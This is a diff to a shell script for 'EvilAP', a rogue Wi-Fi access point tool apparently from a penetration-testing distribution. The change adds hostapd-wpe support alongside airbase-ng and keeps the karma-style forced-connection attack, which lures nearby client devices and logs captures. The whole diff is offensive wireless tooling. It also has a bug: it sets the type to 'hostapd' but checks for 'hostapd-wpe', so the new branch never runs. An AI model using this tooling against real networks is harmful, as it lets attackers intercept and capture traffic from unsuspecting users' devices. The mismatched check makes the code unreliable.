@@ -81,6 +81,7 @@ f_channel(){
 }
 
 f_beacon_rate(){
+  [ "${evilap_type}" != "airbase-ng" ] && return 0
   clear
   printf "\n[+] Enter the beacon rate at which to broadcast probe requests:\n\n"
   printf "[!] If clients don't stay connected try changing this value\n\n"
@@ -120,6 +121,14 @@ f_logname(){
   printf "/opt/pwnix/captures/wireless/evilap-$(date +%s).log\n"
 }
 
+f_evilap_type(){
+  if [ -x /usr/sbin/hostapd-wpe ]; then
+    evilap_type="hostapd"
+  else
+    evilap_type="airbase-ng"
+  fi
+}
+
 f_karmaornot(){
   clear
   printf "\n[?] Force clients to connect with their probe requests?\n\n"
@@ -131,11 +140,13 @@ f_karmaornot(){
     1)
       printf "[+] Starting EvilAP with forced connection attack\n"
       f_beacon_rate
-      evil_flags="-P -C $brate"
+      airbase_flags="-P -C $brate"
+      hostap_flags="-s -k"
       ;;
     2)
       printf "[+] Starting EvilAP without forced connection attack\n"
-      evil_flags=""
+      airbase_flags=""
+      hostap_flags=""
       ;;
     *) f_karmaornot ;;
   esac
@@ -149,8 +160,14 @@ f_karmaornot(){
   trap f_endclean INT
   trap f_endclean KILL
 
-  #Start Airbase-ng with -P for preferred networks
-  airbase-ng $evil_flags -c $channel -e "$ssid" -v wlan1mon > $logname 2>&1 &
+  #Start evilap
+  if [ "${evilap_type}" = "airbase-ng" ]; then
+    airbase-ng $airbase_flags -c $channel -e "$ssid" -v wlan1mon > $logname 2>&1 &
+  elif [ "${evilap_type}" = "hostapd-wpe" ]; then
+    hostapd_conf=$(mktemp -t hostapd.conf-XXXX)
+    printf "interface=wlan1\nssid=\"$ssid\"\nchannel=$channel\n" > "${hostapd_conf}"
+    hostapd-wpe $hostap_flags -t "${hostapd_conf}"
+  fi
   sleep 2
 
   #Bring up virtual interface at0
@@ -186,6 +203,7 @@ if [ "$?" = "0" ]; then
   [ "$EXIT_NOW" = 0 ] && f_ssid
   [ "$EXIT_NOW" = 0 ] && f_channel_list wlan1mon
   [ "$EXIT_NOW" = 0 ] && f_channel
+  [ "$EXIT_NOW" = 0 ] && f_evilap_type
   [ "$EXIT_NOW" = 0 ] && f_karmaornot
   [ "$EXIT_NOW" = 0 ] && f_endclean
 fi
